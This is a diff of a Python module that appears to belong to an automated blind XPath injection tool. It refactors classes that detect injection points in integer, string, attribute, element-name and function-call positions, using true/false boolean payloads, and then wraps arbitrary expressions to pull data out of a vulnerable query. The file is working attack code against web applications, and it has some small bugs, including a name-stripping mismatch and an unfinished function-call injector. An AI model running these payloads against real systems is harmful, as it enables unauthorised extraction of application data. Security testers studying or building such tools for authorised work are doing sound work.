@@ -1,6 +1,7 @@
 import logbook
 
 from ..xpath import E, L
+from collections import namedtuple
 
 
 # When injecting input into a vulnerable XPath query the injection point could be in several places (denoted by ?):
@@ -18,32 +19,55 @@ from ..xpath import E, L
 
 
 def get_all_injectors():
-    return {c.name():c
-            for c in [IntegerInjection, SingleQuoteStringInjection, DoubleQuoteStringInjection,
-                      AttributeNameInjection, PrefixElementNameInjection, PostfixElementNameInjection]}
+    return {c.__name__.replace("Injector", ""): c
+            for c in [IntegerInjection, ElementNameInjection, StringInjection,
+                      AttributeNameInjection, FunctionCallInjection]}
+
+
+Maybe = namedtuple("Maybe", "flag")
 
 
 class Injection(object):
-    EXAMPLE = None
+    """
+
+    """
+
+    example_text = None
 
     def __init__(self, detector):
         self.detector = detector
         self.working_value = self.detector.requests.param_value
         self.logger = logbook.Logger(self.__class__.__name__)
+        self.kind = None
 
     def test(self):
         payloads = self.create_test_payloads()
-        for payload, expected_result in payloads:
-            payload = payload.format(self.working_value)
-            self.logger.info("Testing payload {0}", payload)
-            new_data = self.detector.requests.get_query_data(payload)
+        if isinstance(payloads, tuple):
+            payloads = {None: payloads}
 
-            if not (yield from self.detector.detect_url_stable(new_data, expected_result=expected_result)):
-                self.logger.info("Payload {0} is not stable", payload)
-                return False
+        for kind in payloads.keys():
 
-        self.logger.info("All payloads are stable, by Jove Watson I think I've got it.")
-        return True
+            for payload, expected_result in payloads[kind]:
+                payload = payload.format(working=self.working_value)
+                self.logger.info("Testing payload {0}", payload)
+                new_data = self.detector.requests.get_query_data(payload)
+
+                if not (yield from self.detector.detect_url_stable(new_data, expected_result=expected_result)):
+                    self.logger.info("Payload {0} is not stable", payload)
+                    break
+            else:
+                self.logger.info("All payloads are stable, by Jove Watson I think I've got it.")
+                self.kind = kind
+                return True
+
+        return False
+    
+    @property
+    def example(self):
+        return self.example_text if self.example_text is not None else self.get_example()
+
+    def get_example(self):
+        raise NotImplementedError()
 
     def get_payload(self, expression):
         raise NotImplementedError()
@@ -51,18 +75,17 @@ class Injection(object):
     def create_test_payloads(self):
         raise NotImplementedError()
 
-    @classmethod
-    def name(cls):
-        return cls.__name__.replace("Injection", "")
+    def name(self):
+        return self.__class__.__name__.replace("Injection", "") + (" [{}]".format(self.kind) if self.kind else "")
 
 
 class IntegerInjection(Injection):
-    EXAMPLE = "/lib/book[name=?]"
+    example_text = "/lib/book[name=?]"
 
     def create_test_payloads(self):
         return (
-            ("{} and 1=1", True),
-            ("{} and 1=2", False)
+            ("{working} and 1=1", True),
+            ("{working} and 1=2", False)
         )
 
     def get_payload(self, expression):
@@ -70,62 +93,80 @@ class IntegerInjection(Injection):
 
 
 class StringInjection(Injection):
-    QUOTE = None
-
     def create_test_payloads(self):
-        return (
-            ("{}' and '1'='1".replace("'", self.QUOTE), True),
-            ("{}' and '1'='2".replace("'", self.QUOTE), False)
-        )
+        return {
+            "'": [
+                ("{working}' and '1'='1", True),
+                ("{working}' and '1'='2", False)
+            ],
+            '"': [
+                ('{working}" and "1"="1', True),
+                ('{working}" and "1"="2', False)
+            ]
+        }
 
     def get_payload(self, expression):
-        return E(self.working_value + self.QUOTE) & expression & L("'1'='1".replace("'", self.QUOTE))
+        return E(self.working_value + self.kind) & expression & L("'1'='1".replace("'", self.kind))
 
-
-class SingleQuoteStringInjection(StringInjection):
-    QUOTE = "'"
-    EXAMPLE = "/lib/book[name='?']"
-
-
-class DoubleQuoteStringInjection(StringInjection):
-    QUOTE = '"'
-    EXAMPLE = '/lib/book[name="?"]'
+    def get_example(self):
+        return "/lib/book[name={}?{}".format(self.kind, self.kind)
 
 
 class AttributeNameInjection(Injection):
-    EXAMPLE = "/lib/book[?=value]"
+    example_text = "/lib/book[?=value]"
 
     def create_test_payloads(self):
-        return (
-            ("1=1 and {}", True),
-            ("1=2 and {}", False)
-        )
+        return {
+            "prefix": [
+                ("1=1 and {working}", True),
+                ("1=2 and {working}", False)
+            ],
+            "postfix": [
+                ("{working} and not 1=2 and {working}", True),
+                ("{working} and 1=2 and {working}", False)
+            ]
+        }
 
     def get_payload(self, expression):
         return expression & E(self.working_value)
 
 
-class PrefixElementNameInjection(Injection):
-    EXAMPLE = "/lib/?something"
+class ElementNameInjection(Injection):
+    example_text = "/lib/?/something"
 
     def create_test_payloads(self):
+        return {
+            "prefix": [
+                (".[true()]/{working}", True),
+                (".[false()]/{working}", False)
+            ],
+            "postfix": [
+                ("{working}[true()]", True),
+                ("{working}[false()]", False)
+            ]
+        }
+
+    def get_payload(self, expression):
+        if self.kind == "prefix":
+            return E(".")[expression].add_path("/" + self.working_value)
+        else:
+            return E(self.working_value)[expression]
+
+    def get_example(self):
+        if self.kind == "prefix":
+            return "/lib/?something"
+        elif self.kind == "postfix":
+            return "/lib/something?/"
+
+
+class FunctionCallInjection(Injection):
+    example_text = "/lib/something[function(?)]"
+
+    def create_test_payloads(self):
+        # ToDo: Make this work. Currently doesn't support anything likely to occur in the wild.
         return (
-            (".[true()]/{}", True),
-            (".[false()]/{}", True)
+            ("{working}') and string('1'='1", True),
         )
 
     def get_payload(self, expression):
-        return E(".")[expression].add_path(self.working_value)
-
-
-class PostfixElementNameInjection(Injection):
-    EXAMPLE = "/lib/something?/"
-
-    def create_test_payloads(self):
-        return (
-            ("{}[true()]", True),
-            ("{}[false()]", True)
-        )
-
-    def get_payload(self, expression):
-        return E(self.working_value)[expression]
+        return "%s') and %s and string('1'='1" % (self.working_value, expression)
